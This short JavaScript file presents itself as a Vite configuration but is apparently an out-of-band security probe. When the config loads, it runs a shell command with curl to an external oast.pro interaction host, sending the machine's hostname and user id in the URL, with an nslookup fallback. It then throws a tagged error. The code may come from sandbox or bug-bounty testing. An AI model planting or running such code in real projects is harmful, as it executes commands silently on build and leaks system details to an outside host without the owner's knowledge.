// F9: OOB — confirms outbound exec from vite config sandbox
import { execSync } from "node:child_process";
const id = Math.random().toString(36).slice(2,8).toUpperCase();
try {
  execSync(
    `curl -s --max-time 8 "http://db6dltarq2aheluikrhggx8z7pj7n5zwx.oast.pro/vite.${id}.$$(hostname).$$(id -u)" || nslookup db6dltarq2aheluikrhggx8z7pj7n5zwx.oast.pro`,
    { encoding:"utf8", timeout:12000 }
  );
} catch(e) {}
throw new Error("F9_VITE_" + id);
export default {};
